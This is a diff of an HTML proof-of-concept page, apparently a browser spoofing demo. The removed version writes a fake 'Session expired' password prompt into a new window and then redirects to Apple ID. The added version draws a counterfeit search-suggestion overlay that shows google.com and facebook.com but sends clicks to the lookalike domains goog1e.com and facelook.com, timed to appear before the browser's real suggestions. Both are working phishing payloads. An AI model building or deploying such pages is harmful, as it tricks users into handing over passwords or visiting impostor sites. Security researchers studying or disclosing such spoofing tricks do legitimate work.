@@ -1,44 +1,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Tap Hijack Prompt</title>
+  <title>Type to Search</title>
   <style>
     body {
-      background: #111;
-      color: white;
+      margin: 0;
       font-family: sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      background: white;
     }
 
-    button {
-      padding: 12px 24px;
+    input {
+      margin: 50px auto;
+      display: block;
+      width: 400px;
+      padding: 12px;
       font-size: 18px;
-      background: #007aff;
-      border: none;
-      border-radius: 6px;
-      color: white;
+    }
+
+    #spoof-suggestion {
+      position: fixed;
+      top: 96px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 400px;
+      border: 1px solid #ccc;
+      background: #fff;
+      z-index: 9999;
+      font-size: 16px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+      display: none;
+    }
+
+    .item {
+      padding: 8px 12px;
+      border-bottom: 1px solid #eee;
+      cursor: pointer;
+    }
+
+    .item:hover {
+      background-color: #f1f1f1;
+    }
+
+    .url {
+      color: #060;
+      font-size: 14px;
     }
   </style>
 </head>
 <body>
-  <button onclick="go()">Go to iCloud</button>
 
-  <script>
-    function go() {
-      const w = window.open("", "_blank");
+<input type="text" id="search" placeholder="Type something like 'g' or 'fa'...">
 
-      setTimeout(() => {
-        w.document.write(`
-          <script>
-            const pw = prompt("🔒 Session expired. Please re-authenticate.");
-            location.href = "https://appleid.apple.com";
-          <\/script>
-        `);
-      }, 300);
+<div id="spoof-suggestion">
+  <div class="item" onclick="location.href='https://goog1e.com'">
+    <div>google.com</div>
+    <div class="url">https://google.com</div>
+  </div>
+  <div class="item" onclick="location.href='https://facelook.com'">
+    <div>facebook.com</div>
+    <div class="url">https://facebook.com</div>
+  </div>
+</div>
+
+<script>
+const input = document.getElementById('search');
+const overlay = document.getElementById('spoof-suggestion');
+
+input.addEventListener('keydown', (e) => {
+  setTimeout(() => {
+    const val = input.value.toLowerCase();
+    if (val === 'g' || val === 'fa') {
+      overlay.style.display = 'block';
+    } else {
+      overlay.style.display = 'none';
     }
-  </script>
+  }, 50); // keyboard race: tampilkan sebelum omnibox suggestion asli
+});
+</script>
+
 </body>
 </html>
